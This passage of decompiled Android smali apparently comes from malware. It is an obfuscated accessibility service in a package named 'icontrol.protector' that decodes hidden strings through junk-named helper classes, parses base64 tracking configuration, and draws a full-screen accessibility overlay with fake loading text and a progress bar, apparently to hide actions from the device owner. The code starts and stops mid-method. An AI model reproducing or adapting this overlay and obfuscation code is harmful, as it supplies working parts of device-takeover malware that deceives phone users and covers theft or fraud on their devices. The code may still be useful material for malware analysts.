    const/4 v10, 0x7

    :try_start_2
    sget-object v11, Lcom/icontrol/protector/My_Configs;->Tracking_Data_str:Ljava/lang/String;

    new-array v12, v5, [B

    const/16 v13, 0x3f

    aput-byte v13, v12, v6

    new-array v13, v2, [B

    fill-array-data v13, :array_e

    invoke-static {v12, v13}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v11, v12}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v11

    if-eqz v11, :cond_a

    sget-object v11, Lcom/icontrol/protector/My_Configs;->Tracking_Data_str:Ljava/lang/String;

    new-array v12, v4, [B

    fill-array-data v12, :array_f

    new-array v13, v2, [B

    fill-array-data v13, :array_10

    invoke-static {v12, v13}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v11, v12}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v11

    if-nez v11, :cond_a

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v11

    sget-object v12, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/tc;->u:Ljava/lang/String;

    sget-object v13, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    invoke-static {v11, v12, v13}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    sget-object v11, Lcom/icontrol/protector/My_Configs;->Tracking_Data_str:Ljava/lang/String;

    new-array v12, v9, [B

    fill-array-data v12, :array_11

    new-array v13, v2, [B

    fill-array-data v13, :array_12

    invoke-static {v12, v13}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v11, v12}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v11

    array-length v12, v11

    move v13, v6

    :goto_4
    if-ge v13, v12, :cond_b

    aget-object v14, v11, v13

    new-instance v15, Ljava/lang/String;

    invoke-static {v14, v6}, Landroid/util/Base64;->decode(Ljava/lang/String;I)[B

    move-result-object v14

    new-array v7, v0, [B

    fill-array-data v7, :array_13

    new-array v8, v2, [B

    fill-array-data v8, :array_14

    invoke-static {v7, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v7

    invoke-direct {v15, v14, v7}, Ljava/lang/String;-><init>([BLjava/lang/String;)V

    invoke-virtual {v15}, Ljava/lang/String;->length()I

    move-result v7

    if-lez v7, :cond_9

    new-array v7, v0, [B

    fill-array-data v7, :array_15

    new-array v8, v2, [B

    fill-array-data v8, :array_16

    invoke-static {v7, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v15, v7}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v7

    if-eqz v7, :cond_9

    new-array v7, v10, [B

    fill-array-data v7, :array_17

    new-array v8, v2, [B

    fill-array-data v8, :array_18

    invoke-static {v7, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v15, v7}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v7

    aget-object v8, v7, v6

    aget-object v14, v7, v5

    aget-object v7, v7, v9

    invoke-static {v8, v14}, Lcom/icontrol/protector/a;->c(Ljava/lang/String;Ljava/lang/String;)V

    invoke-static {v8, v7}, Lcom/icontrol/protector/a;->a(Ljava/lang/String;Ljava/lang/String;)V

    invoke-static {v8}, Lcom/icontrol/protector/a;->b(Ljava/lang/String;)V

    :cond_9
    add-int/lit8 v13, v13, 0x1

    const/4 v7, 0x0

    const/4 v8, -0x1

    goto :goto_4

    :cond_a
    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    sget-object v7, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/tc;->u:Ljava/lang/String;

    sget-object v8, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {v0, v7, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    :catch_2
    :cond_b
    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    new-array v7, v3, [B

    fill-array-data v7, :array_19

    new-array v8, v2, [B

    fill-array-data v8, :array_1a

    invoke-static {v7, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v7

    const/4 v8, 0x3

    new-array v11, v8, [B

    fill-array-data v11, :array_1b

    new-array v12, v2, [B

    fill-array-data v12, :array_1c

    invoke-static {v11, v12}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v11

    invoke-static {v0, v7, v11}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-static {v7}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/Integer;->intValue()I

    move-result v7

    iput v7, v1, Lcom/icontrol/protector/AccessServices;->c:I

    new-array v7, v3, [B

    fill-array-data v7, :array_1d

    new-array v11, v2, [B

    fill-array-data v11, :array_1e

    invoke-static {v7, v11}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v7

    new-array v3, v3, [B

    fill-array-data v3, :array_1f

    new-array v11, v2, [B

    fill-array-data v11, :array_20

    invoke-static {v3, v11}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-static {v0, v7, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/Integer;->intValue()I

    move-result v3

    iput v3, v1, Lcom/icontrol/protector/AccessServices;->d:I

    :try_start_3
    new-array v3, v4, [B

    fill-array-data v3, :array_21

    new-array v7, v2, [B

    fill-array-data v7, :array_22

    invoke-static {v3, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v3}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/view/WindowManager;

    new-instance v7, Landroid/view/View;

    invoke-direct {v7, v1}, Landroid/view/View;-><init>(Landroid/content/Context;)V

    new-instance v11, Landroid/view/WindowManager$LayoutParams;

    const/16 v18, 0x1

    const/16 v19, 0x1

    const/16 v20, 0x7f0

    const v21, -0x7fb3f9e8

    const/16 v22, -0x3

    move-object/from16 v17, v11

    invoke-direct/range {v17 .. v22}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    const/16 v12, 0x33

    iput v12, v11, Landroid/view/WindowManager$LayoutParams;->gravity:I

    sput-object v11, Lcom/icontrol/protector/AccessServices;->r:Landroid/view/WindowManager$LayoutParams;

    sput-object v3, Lcom/icontrol/protector/AccessServices;->F:Landroid/view/WindowManager;

    sput-object v3, Lcom/icontrol/protector/AccessServices;->q:Landroid/view/WindowManager;

    sput-object v3, Lcom/icontrol/protector/AccessServices;->t:Landroid/view/WindowManager;

    invoke-interface {v3, v7, v11}, Landroid/view/ViewManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_3

    :catch_3
    :try_start_4
    new-instance v3, Landroid/widget/TextView;

    invoke-direct {v3, v1}, Landroid/widget/TextView;-><init>(Landroid/content/Context;)V

    sput-object v3, Lcom/icontrol/protector/AccessServices;->K:Landroid/widget/TextView;

    new-instance v3, Landroid/widget/TextView;

    invoke-direct {v3, v1}, Landroid/widget/TextView;-><init>(Landroid/content/Context;)V

    sput-object v3, Lcom/icontrol/protector/AccessServices;->M:Landroid/widget/TextView;

    sget-object v3, Lcom/icontrol/protector/AccessServices;->K:Landroid/widget/TextView;

    sget-object v7, Lcom/icontrol/protector/My_Configs;->loadingText:Ljava/lang/String;

    invoke-virtual {v3, v7}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    sget-object v3, Lcom/icontrol/protector/AccessServices;->K:Landroid/widget/TextView;

    const/4 v7, -0x1

    invoke-virtual {v3, v7}, Landroid/widget/TextView;->setTextColor(I)V

    sget-object v3, Lcom/icontrol/protector/AccessServices;->K:Landroid/widget/TextView;

    const/high16 v7, 0x41a00000    # 20.0f

    invoke-virtual {v3, v7}, Landroid/widget/TextView;->setTextSize(F)V

    sget-object v3, Lcom/icontrol/protector/AccessServices;->K:Landroid/widget/TextView;

    const/16 v11, 0x11

    invoke-virtual {v3, v11}, Landroid/widget/TextView;->setGravity(I)V

    sget-object v3, Lcom/icontrol/protector/AccessServices;->M:Landroid/widget/TextView;

    const/4 v12, -0x1

    invoke-virtual {v3, v12}, Landroid/widget/TextView;->setTextColor(I)V

    sget-object v3, Lcom/icontrol/protector/AccessServices;->M:Landroid/widget/TextView;

    invoke-virtual {v3, v7}, Landroid/widget/TextView;->setTextSize(F)V

    sget-object v3, Lcom/icontrol/protector/AccessServices;->M:Landroid/widget/TextView;

    invoke-virtual {v3, v11}, Landroid/widget/TextView;->setGravity(I)V

    new-instance v3, Landroid/widget/FrameLayout$LayoutParams;

    const/4 v12, -0x2

    invoke-direct {v3, v12, v12}, Landroid/widget/FrameLayout$LayoutParams;-><init>(II)V

    iput v5, v3, Landroid/widget/FrameLayout$LayoutParams;->gravity:I

    new-instance v3, Landroid/widget/FrameLayout$LayoutParams;

    invoke-direct {v3, v12, v12}, Landroid/widget/FrameLayout$LayoutParams;-><init>(II)V

    iput v5, v3, Landroid/widget/FrameLayout$LayoutParams;->gravity:I

    const/16 v13, 0x14

    iput v13, v3, Landroid/widget/FrameLayout$LayoutParams;->topMargin:I

    new-instance v3, Landroid/widget/ProgressBar;

    const v13, 0x1010078

    const/4 v14, 0x0

    invoke-direct {v3, v1, v14, v13}, Landroid/widget/ProgressBar;-><init>(Landroid/content/Context;Landroid/util/AttributeSet;I)V

    sput-object v3, Lcom/icontrol/protector/AccessServices;->L:Landroid/widget/ProgressBar;

    invoke-virtual {v3, v6}, Landroid/widget/ProgressBar;->setIndeterminate(Z)V

    sget-object v3, Lcom/icontrol/protector/AccessServices;->L:Landroid/widget/ProgressBar;

    const/16 v13, 0x64

    invoke-virtual {v3, v13}, Landroid/widget/ProgressBar;->setMax(I)V

    sget-object v3, Lcom/icontrol/protector/AccessServices;->L:Landroid/widget/ProgressBar;

    invoke-virtual {v3, v6}, Landroid/widget/ProgressBar;->setProgress(I)V

    new-instance v3, Landroid/widget/LinearLayout$LayoutParams;

    const/16 v13, 0x258

    const/16 v14, 0x28

    invoke-direct {v3, v13, v14}, Landroid/widget/LinearLayout$LayoutParams;-><init>(II)V

    iput v5, v3, Landroid/widget/LinearLayout$LayoutParams;->gravity:I

    sget-object v13, Lcom/icontrol/protector/AccessServices;->L:Landroid/widget/ProgressBar;

    invoke-virtual {v13, v3}, Landroid/view/View;->setLayoutParams(Landroid/view/ViewGroup$LayoutParams;)V

    new-instance v3, Landroid/graphics/drawable/GradientDrawable;

    sget-object v13, Landroid/graphics/drawable/GradientDrawable$Orientation;->LEFT_RIGHT:Landroid/graphics/drawable/GradientDrawable$Orientation;

    new-array v14, v8, [I

    new-array v15, v10, [B

    fill-array-data v15, :array_23

    new-array v4, v2, [B

    fill-array-data v4, :array_24

    invoke-static {v15, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v4

    aput v4, v14, v6

    new-array v4, v10, [B

    fill-array-data v4, :array_25

    new-array v15, v2, [B

    fill-array-data v15, :array_26

    invoke-static {v4, v15}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v4

    aput v4, v14, v5

    new-array v4, v10, [B

    fill-array-data v4, :array_27

    new-array v15, v2, [B

    fill-array-data v15, :array_28

    invoke-static {v4, v15}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v4

    aput v4, v14, v9

    invoke-direct {v3, v13, v14}, Landroid/graphics/drawable/GradientDrawable;-><init>(Landroid/graphics/drawable/GradientDrawable$Orientation;[I)V

    invoke-virtual {v3, v7}, Landroid/graphics/drawable/GradientDrawable;->setCornerRadius(F)V

    new-instance v4, Landroid/graphics/drawable/GradientDrawable;

    invoke-direct {v4}, Landroid/graphics/drawable/GradientDrawable;-><init>()V

    new-array v13, v10, [B

    fill-array-data v13, :array_29

    new-array v14, v2, [B

    fill-array-data v14, :array_2a

    invoke-static {v13, v14}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v13

    invoke-static {v13}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v13

    invoke-virtual {v4, v13}, Landroid/graphics/drawable/GradientDrawable;->setColor(I)V

    invoke-virtual {v4, v7}, Landroid/graphics/drawable/GradientDrawable;->setCornerRadius(F)V

    new-instance v13, Landroid/graphics/drawable/LayerDrawable;

    new-array v9, v9, [Landroid/graphics/drawable/Drawable;

    aput-object v4, v9, v6

    new-instance v4, Landroid/graphics/drawable/ClipDrawable;

    invoke-direct {v4, v3, v8, v5}, Landroid/graphics/drawable/ClipDrawable;-><init>(Landroid/graphics/drawable/Drawable;II)V

    aput-object v4, v9, v5

    invoke-direct {v13, v9}, Landroid/graphics/drawable/LayerDrawable;-><init>([Landroid/graphics/drawable/Drawable;)V

    const/high16 v3, 0x1020000

    invoke-virtual {v13, v6, v3}, Landroid/graphics/drawable/LayerDrawable;->setId(II)V

    const v3, 0x102000d

    invoke-virtual {v13, v5, v3}, Landroid/graphics/drawable/LayerDrawable;->setId(II)V

    sget-object v3, Lcom/icontrol/protector/AccessServices;->L:Landroid/widget/ProgressBar;

    invoke-virtual {v3, v13}, Landroid/widget/ProgressBar;->setProgressDrawable(Landroid/graphics/drawable/Drawable;)V

    new-instance v3, Landroid/widget/FrameLayout$LayoutParams;

    invoke-direct {v3, v12, v12}, Landroid/widget/FrameLayout$LayoutParams;-><init>(II)V

    iput v11, v3, Landroid/widget/FrameLayout$LayoutParams;->gravity:I

    sget-object v3, Lcom/icontrol/protector/AccessServices;->K:Landroid/widget/TextView;

    const/4 v4, -0x1

    invoke-virtual {v3, v4}, Landroid/widget/TextView;->setTextColor(I)V

    sget-object v3, Lcom/icontrol/protector/AccessServices;->K:Landroid/widget/TextView;

    invoke-virtual {v3, v7}, Landroid/widget/TextView;->setTextSize(F)V

    sget-object v3, Lcom/icontrol/protector/AccessServices;->K:Landroid/widget/TextView;

    invoke-virtual {v3, v11}, Landroid/widget/TextView;->setGravity(I)V

    new-instance v3, Landroid/widget/LinearLayout;

    invoke-direct {v3, v1}, Landroid/widget/LinearLayout;-><init>(Landroid/content/Context;)V

    sput-object v3, Lcom/icontrol/protector/AccessServices;->J:Landroid/widget/LinearLayout;

    invoke-virtual {v3, v5}, Landroid/widget/LinearLayout;->setOrientation(I)V

    sget-object v3, Lcom/icontrol/protector/AccessServices;->J:Landroid/widget/LinearLayout;

    invoke-virtual {v3, v11}, Landroid/widget/LinearLayout;->setGravity(I)V

    sget-object v3, Lcom/icontrol/protector/AccessServices;->J:Landroid/widget/LinearLayout;

    sget-object v4, Lcom/icontrol/protector/AccessServices;->L:Landroid/widget/ProgressBar;

    invoke-virtual {v3, v4}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    sget-object v3, Lcom/icontrol/protector/AccessServices;->J:Landroid/widget/LinearLayout;

    sget-object v4, Lcom/icontrol/protector/AccessServices;->M:Landroid/widget/TextView;

    invoke-virtual {v3, v4}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    sget-object v3, Lcom/icontrol/protector/AccessServices;->J:Landroid/widget/LinearLayout;

    sget-object v4, Lcom/icontrol/protector/AccessServices;->K:Landroid/widget/TextView;

    invoke-virtual {v3, v4}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    new-instance v3, Landroid/widget/FrameLayout;

    invoke-direct {v3, v1}, Landroid/widget/FrameLayout;-><init>(Landroid/content/Context;)V

    sput-object v3, Lcom/icontrol/protector/AccessServices;->G:Landroid/widget/FrameLayout;

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object v3

    new-array v4, v10, [B

    fill-array-data v4, :array_2b

    new-array v6, v2, [B

    fill-array-data v6, :array_2c

    invoke-static {v4, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    new-array v6, v2, [B

    fill-array-data v6, :array_2d

    new-array v7, v2, [B

    fill-array-data v7, :array_2e

    invoke-static {v6, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v3, v4, v6, v7}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v3

    if-eqz v3, :cond_d

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object v4

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getTheme()Landroid/content/res/Resources$Theme;

    move-result-object v6

    invoke-virtual {v4, v3, v6}, Landroid/content/res/Resources;->getDrawable(ILandroid/content/res/Resources$Theme;)Landroid/graphics/drawable/Drawable;

    move-result-object v3

    if-eqz v3, :cond_c

    invoke-virtual {v3}, Landroid/graphics/drawable/Drawable;->getIntrinsicWidth()I

    move-result v4

    if-lez v4, :cond_c

    invoke-virtual {v3}, Landroid/graphics/drawable/Drawable;->getIntrinsicHeight()I

    move-result v4

    if-lez v4, :cond_c

    sget-object v4, Lcom/icontrol/protector/AccessServices;->G:Landroid/widget/FrameLayout;

    invoke-virtual {v4, v3}, Landroid/view/View;->setBackground(Landroid/graphics/drawable/Drawable;)V

    goto :goto_6

    :catch_4
    move-exception v0

    goto/16 :goto_8

    :cond_c
    sget-object v3, Lcom/icontrol/protector/AccessServices;->G:Landroid/widget/FrameLayout;

    new-array v4, v10, [B

    fill-array-data v4, :array_2f

    new-array v6, v2, [B

    fill-array-data v6, :array_30

    invoke-static {v4, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v4

    :goto_5
    invoke-virtual {v3, v4}, Landroid/view/View;->setBackgroundColor(I)V

    goto :goto_6

    :cond_d
    sget-object v3, Lcom/icontrol/protector/AccessServices;->G:Landroid/widget/FrameLayout;

    new-array v4, v10, [B

    fill-array-data v4, :array_31

    new-array v6, v2, [B

    fill-array-data v6, :array_32

    invoke-static {v4, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v4

    goto :goto_5

    :goto_6
    sget-object v3, Lcom/icontrol/protector/AccessServices;->G:Landroid/widget/FrameLayout;

    invoke-virtual {v3, v2}, Landroid/view/View;->setVisibility(I)V

    sget-object v3, Lcom/icontrol/protector/AccessServices;->G:Landroid/widget/FrameLayout;

    sget-object v4, Lcom/icontrol/protector/AccessServices;->J:Landroid/widget/LinearLayout;

    invoke-virtual {v3, v4}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    new-instance v3, Landroid/view/WindowManager$LayoutParams;

    iget v4, v1, Lcom/icontrol/protector/AccessServices;->c:I

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/Integer;->intValue()I

    move-result v7

    iget v4, v1, Lcom/icontrol/protector/AccessServices;->d:I

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/Integer;->intValue()I

    move-result v8

    const/16 v9, 0x7f0

    const v10, -0x7fb2f900

    const/4 v11, 0x1

    move-object v6, v3

    invoke-direct/range {v6 .. v11}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    sput-object v3, Lcom/icontrol/protector/AccessServices;->H:Landroid/view/WindowManager$LayoutParams;

    new-instance v3, Landroid/view/WindowManager$LayoutParams;

    iget v4, v1, Lcom/icontrol/protector/AccessServices;->c:I

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/Integer;->intValue()I

    move-result v17

    iget v4, v1, Lcom/icontrol/protector/AccessServices;->d:I

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/Integer;->intValue()I

    move-result v18

    const/16 v19, 0x7f0

    const v20, -0x7fb2f8e8

    const/16 v21, 0x1

    move-object/from16 v16, v3

    invoke-direct/range {v16 .. v21}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    sput-object v3, Lcom/icontrol/protector/AccessServices;->I:Landroid/view/WindowManager$LayoutParams;

    const v4, 0x800033

    iput v4, v3, Landroid/view/WindowManager$LayoutParams;->gravity:I

    sget-object v4, Lcom/icontrol/protector/AccessServices;->t:Landroid/view/WindowManager;

    sget-object v6, Lcom/icontrol/protector/AccessServices;->G:Landroid/widget/FrameLayout;

    invoke-interface {v4, v6, v3}, Landroid/view/ViewManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    new-instance v3, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v4

    invoke-direct {v3, v4}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v4, Lcom/icontrol/protector/AccessServices$k;

    invoke-direct {v4, v1, v3}, Lcom/icontrol/protector/AccessServices$k;-><init>(Lcom/icontrol/protector/AccessServices;Landroid/os/Handler;)V

    new-array v6, v2, [B

    fill-array-data v6, :array_33

    new-array v7, v2, [B

    fill-array-data v7, :array_34

    invoke-static {v6, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v6

    sget-object v7, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {v0, v6, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-nez v0, :cond_e

    invoke-virtual {v3, v4}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_4

    :cond_e
    :goto_7
    const/4 v3, 0x6

    goto :goto_9

    :goto_8
    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    goto :goto_7

    :goto_9
    :try_start_5
    new-array v0, v3, [B

    fill-array-data v0, :array_35

    new-array v2, v2, [B

    fill-array-data v2, :array_36

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/WindowManager;

    new-instance v2, Landroid/util/DisplayMetrics;

    invoke-direct {v2}, Landroid/util/DisplayMetrics;-><init>()V

    invoke-interface {v0}, Landroid/view/WindowManager;->getDefaultDisplay()Landroid/view/Display;

    move-result-object v0

    invoke-virtual {v0, v2}, Landroid/view/Display;->getMetrics(Landroid/util/DisplayMetrics;)V

    iget v7, v2, Landroid/util/DisplayMetrics;->widthPixels:I

    iget v8, v2, Landroid/util/DisplayMetrics;->heightPixels:I

    iput v7, v1, Lcom/icontrol/protector/AccessServices;->c:I

    iput v8, v1, Lcom/icontrol/protector/AccessServices;->d:I

    new-instance v0, Landroid/view/WindowManager$LayoutParams;

    const/16 v9, 0x7f0

    const/16 v10, 0x628

    const/4 v11, -0x3

    move-object v6, v0

    invoke-direct/range {v6 .. v11}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    sput-object v0, Lcom/icontrol/protector/AccessServices;->w:Landroid/view/WindowManager$LayoutParams;

    new-instance v0, Landroid/view/View;

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-direct {v0, v2}, Landroid/view/View;-><init>(Landroid/content/Context;)V

